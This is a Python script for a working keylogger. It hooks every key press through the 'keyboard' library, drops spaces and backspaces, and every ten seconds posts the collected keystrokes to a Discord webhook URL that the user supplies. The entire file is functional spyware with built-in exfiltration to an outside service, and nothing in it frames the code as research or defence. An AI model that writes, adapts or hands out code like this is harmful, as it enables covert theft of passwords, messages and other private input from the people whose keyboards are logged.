import keyboard
import time
import requests
import threading

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'Your webhook here'

# Create a list to store the captured keystrokes
keylogs = []

# Function to send keylogs to Discord via webhook
def send_keylogs():
    global keylogs

    if keylogs:
        # Convert the keylogs to a single string (sentence)
        keylogs_str = ''.join(keylogs)

        # Create the payload for the webhook
        payload = {
            'content': keylogs_str
        }

        try:
            # Send the payload to the Discord webhook
            response = requests.post(WEBHOOK_URL, data=payload)

            # Check for a successful response
            if response.status_code == 200:
                print("Keylogs successfully sent.")
            else:
                print(f"Failed to send keylogs. Status code: {response.status_code}")
        
        except Exception as e:
            print(f"Error sending keylogs: {e}")

        # Clear the keylogs list
        keylogs = []

    # Seconds until new message
    threading.Timer(10, send_keylogs).start()

# Function to capture keystrokes
def capture_keystrokes(event):
    global keylogs

    if event.event_type == 'down':  # Only capture key presses (not releases)
        if event.name == 'enter':
            keylogs.append(' \n')  # Insert a newline when 'Enter' is pressed
        elif event.name == 'space' or event.name == 'backspace':
            pass  # Ignore space and backspace
        else:
            keylogs.append(event.name)  # Append the key pressed

# Start capturing keystrokes
keyboard.hook(callback=capture_keystrokes)

# Start sending keylogs to Discord every 10 seconds
send_keylogs()

# Keep the script running
try:
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    # Graceful shutdown on Ctrl+C
    print("\nShutting down...")
    if keylogs:
        print("Sending remaining keylogs before exit...")
        send_keylogs()
